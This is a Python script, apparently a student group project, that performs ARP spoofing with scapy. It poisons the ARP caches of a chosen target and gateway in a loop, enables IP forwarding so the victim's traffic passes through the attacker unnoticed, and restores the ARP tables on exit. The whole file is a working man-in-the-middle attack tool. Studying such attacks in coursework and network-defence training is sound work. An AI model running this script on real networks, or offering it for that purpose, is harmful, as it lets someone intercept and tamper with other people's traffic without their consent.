# Spoofing Program Final Group Project
# Project Group Set 3 - Caban Hernandez, Craine, Hutchinson, Thota

# Imported os to allow python to have os dependent functionality
import os
# Imported scapy for ARP spoofing functions
import scapy.all as scapy
# Imported argparse for writing simple command line interface arguments
import argparse
# Imported time for various time-related functions, such as sleep
import time


def check_for_sudo():
    # This function validates whether the user ran the program as sudo
    if os.geteuid() != 0:
        print("Need to run as sudo.  Exiting...")
        quit()


def check_for_args(arguments):
    # This function validates that the user has passed both arguments
    if arguments.target is not None and arguments.gateway is not None:
        return True
    else:
        return False


def get_arguments():
    # This function parses arguments submitted by user
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="used for setting the target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="used for setting the spoofed gateway IP address")
    return parser.parse_args()


def get_mac(ip):
    # pdst is where ARP packets should go, i.e., the target
    # This function returns the mac address of an IP address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target, gateway):
    # pdst is where ARP packets should go, i.e., the target
    # hwdst is the destination hardware address
    # This function carries out the ARP spoof
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), psrc=gateway)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # This function reverts the changes made by the spoof function
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def port_forwarding(flag):
    # This function ensures that traffic from spoofed target is forwarded so there is no interruption in internet service
    os.system('echo ' + str(flag) + ' > /proc/sys/net/ipv4/ip_forward')


def main():
    arguments = get_arguments()
    print(arguments)
    check_for_sudo()
    if check_for_args(arguments):
        target = arguments.target
        gateway = arguments.gateway
        try:
            port_forwarding(1)
            sent_packets_count = 0
            print("\nPress Ctrl + c to exit...")
            while True:
                spoof(target, gateway)
                spoof(gateway, target)
                sent_packets_count = sent_packets_count + 2
                # the statement below requires Python 3 to continuously update one line of text with number of packets sent
                # unsupported versions of python will result in a new packet count line every two seconds
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nExiting...")
            port_forwarding(0)
            restore(target, gateway)
            restore(gateway, target)
            print("Complete!")
    else:
        print("You must include arguments while running this script.")
        print("Your options are:\n\t -t/--target for the target IP address \n\t -g/--gateway for the spoofed gateway"
              "IP address")
        print("Please see https://docs.python.org/3/library/argparse.html for additional information")
        quit()


# This ensures that the main() function only runs automatically when this file is directly called.
# Without this check it could be triggered upon a successful import to another python file.
if __name__ == '__main__':
    main()
